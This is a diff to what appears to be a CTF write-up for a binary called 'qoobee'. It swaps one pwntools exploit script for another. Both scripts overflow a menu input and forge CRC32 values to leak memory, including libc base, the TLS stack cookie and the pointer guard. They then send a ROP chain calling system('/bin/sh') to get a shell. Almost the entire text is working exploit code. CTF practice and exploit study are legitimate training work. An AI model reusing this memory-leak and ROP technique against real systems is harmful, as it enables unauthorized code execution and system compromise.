@@ -13,102 +13,101 @@ categories:
   
 ###0x01 exp  
   
-	from pwn import *  
-	import crc32  
-  
-	if len(sys.argv)>1:  
-	  r = remote(sys.argv[1], 1002)  
-	else:  
-	  #r = remote('127.0.0.1', 8888)  
-	   r = process('./qoobee')  
-	def leak_crc32(addr):  
-	  r.recvuntil('# ')  
-	  r.send('1\n')  
-	  r.recvuntil('How many dounts you want? ')  
-	  r.send('x'*2040 + p64(addr) + 'aaaaaaaa\n')  
-	  r.recvuntil('# ')  
-	  r.send('3\n')  
-	  r.recvuntil('Input your local system timestamp: ')  
-	  r.send('aaa\n')  
-	  r.recvuntil('Response: ')  
-	  x = int(r.recvuntil('\n')[:-1], 16)  
-	  return x  
-  
-	def leak(leak_buf, addr, n):  
-	  addr -= 8  
-	  s = ''  
-	  for i in range(0, n, 4):  
-	    r.recvuntil('# ')  
-	    r.send('1\n')  
-	    r.recvuntil('How many dounts you want? ')  
-	    r.send('x'*2040 + p64(addr+i) + 'aaaaaaaa\n')  
-	    r.recvuntil('# ')  
-	    r.send('3\n')  
-	    r.recvuntil('Input your local system timestamp: ')  
-	    r.send('aaa\n')  
-	    r.recvuntil('Response: ')  
-	    x = int(r.recvuntil('\n')[:-1], 16)  
-	    x = crc32.forge(x, leak_buf)[-4:]  
-	    s += x  
-	    leak_buf = (leak_buf + x)[-8:]  
-	  return s[:n]  
-  
-	log.info('payload 1')  
-	raw_input()  
-	libz_base = u64(leak(p64(0x400bd6), 0x00007ffff7bc5000, 8))  
-	#libz_base = u64(leak(p64(0x400bd6), 0x6020a0, 8)) - 0x2740  
-	log.info('done')  
-	print 'libz_base = %x' % libz_base  
-	magic = crc32.crc32(unhex('7f454c460201010000000000'))  
-  
-	libc_base = libz_base - 0x6c9000  
-	log.info('payload 2')  
-	raw_input()  
-	ss = leak('\x00'*8, libz_base + 0x4317a0, 24)  
-	log.info('done')  
-	stackguard = u64(ss[8:16])  
-	pointerguard = u64(ss[16:24])  
-  
-	payload = [0]*38  
-	payload[4] = libz_base - 0x309fa0  
-	payload[5] = libz_base - 0x305c20  
-	payload[8] = libz_base - 0x561380  
-	payload[10] = libz_base - 0x561980  
-	payload[12] = libz_base - 0x560a80  
-	payload[30] = libz_base + 0x431780  
-	payload[31] = libz_base + 0x432090  
-	payload[32] = libz_base + 0x431780  
-	payload[35] = stackguard  
-	payload[36] = 0x69ea000000000020 ^ 0x400d79  
-	payload = ''.join(map(p64, payload))  
-  
-	r.recvuntil('# ')  
-	r.send('1\n')  
-	r.recvuntil('How many dounts you want? ')  
-	r.send(str(0x22100) + '\n')		#middle malloc  
-	r.recvuntil('Remark: ')  
-	log.info('payload 3')  
-	raw_input()  
-	r.send('A'*(0x24690-16) + payload + '\n')  
-	log.info('done')  
-  
-	r.recvuntil('# ')  
-	r.send('2\n')  
-	r.recvuntil('Now you can leave me a message: ')  
-  
-	pop_rdi_ret = 0x401503  
-	gets = libc_base + 0x6f440  
-	system = libc_base + 0x46640  
-  
-	log.info('payload 4')  
-	raw_input()  
-	r.send(p64(stackguard)*33 + (  
-	  p64(pop_rdi_ret) + p64(libc_base + 0x17ccdb) + p64(system)   
-	  ) + '\n')  
-	log.info('done')  
-  
-	r.interactive()  
-	r.close()  
+	from pwn import *
+	from binascii import *
+	import crc32
+
+	r = process('./qoobee')
+
+
+	def leak(str, addr, dest):	#leak qword	
+		n = (dest - addr -8)/4 + 2
+		print n
+		res = ''
+		for i in range(n):
+			r.recvuntil('# ')
+			r.send('1\n')
+			r.recvuntil('How many dounts you want? ')
+			r.send('x'*2040 + p64(addr) + 'aaaaaaaa\n')
+			r.recvuntil('# ')
+			r.send('3\n')
+			r.recvuntil('Input your local system timestamp: ')
+			r.send('aaa\n')
+			r.recvuntil('Response: ')
+			x = int(r.recvuntil('\n')[:-1], 16)
+			x = crc32.forge(x, str, 8)[8:]
+	#		print hex(u32(x))
+	#		print b2a_hex(x)
+			str = str[4:]+x
+			res += x
+			addr += 4
+	#		print 'str',b2a_hex(str)
+	#		print b2a_hex(res)
+		return u64(res[-8:])
+
+	t = leak(p64(0x0000000000601e08), 0x602000, 0x602020)
+	libc = t - 5868192
+	m_end = libc + 17211392
+	tls = m_end - 18624 + 0xc000 - 65536
+
+	payload  = p64(tls)*((145200-0x200)/8)
+	print 'tls',hex(tls)
+	cookie = leak(p64(tls), tls, tls+0x28)
+	print 'cookie',hex(cookie)
+	p = leak(p64(tls), tls, tls+0x8)
+	print 'p',hex(p)
+
+
+	payload += p64(0)
+	for i in range(0x200/8 - 1):
+		tmp = leak(p64(0), tls-0x200, tls - 0x200 + (i+1)*8)
+	#	print hex(tls - 0x200 + (i+1)*8), '->',hex(tmp)
+		payload += p64(tmp)
+	payload += 'a'*(145200%8) 
+	payload += p64(tls) + p64(p) + p64(tls) + "cccccccc"*2 + p64(cookie) + p64(0x0400D79 ^ 0x69ea000000000020)
+
+
+	r.recvuntil('# ')
+	r.sendline('1')
+	r.recvuntil('How many dounts you want? ')
+	r.sendline('135168')
+	r.recvuntil(':')
+	r.sendline(payload)
+
+
+	pop_rdi_ret = 0x0000000000401503 
+	pop_rbp_ret = 0x0000000000400cb5
+	leave_ret = 0x0000000000400ddf
+	input = 0x0400E94
+	addr = tls - 0x300
+	wel = 0x400E55
+
+	lib = ELF('/usr/lib/libc.so.6')
+	puts = leak(p64(0x0000000000601e08), 0x602000, 0x602030)
+	base = puts - lib.symbols['puts']
+	i = lib.search('/bin/sh')
+	binsh = i.next() + base 
+	system_ = lib.symbols['system'] + base
+	print 'binsh',hex(binsh)
+	print 'system',hex(system_)
+
+	payload2  = 'a'*0xf8
+	payload2 += p64(cookie)
+	payload2 += p64(cookie)	#ebp
+	payload2 += p64(pop_rdi_ret)	
+	payload2 += p64(binsh)	
+	payload2 += p64(system_)	
+
+	raw_input()
+	r.recvuntil('# ')
+	r.sendline('2')
+	print r.recvuntil(':')
+	r.sendline(payload2)
+
+	r.interactive()
+
+
+
   
 crc32  
   
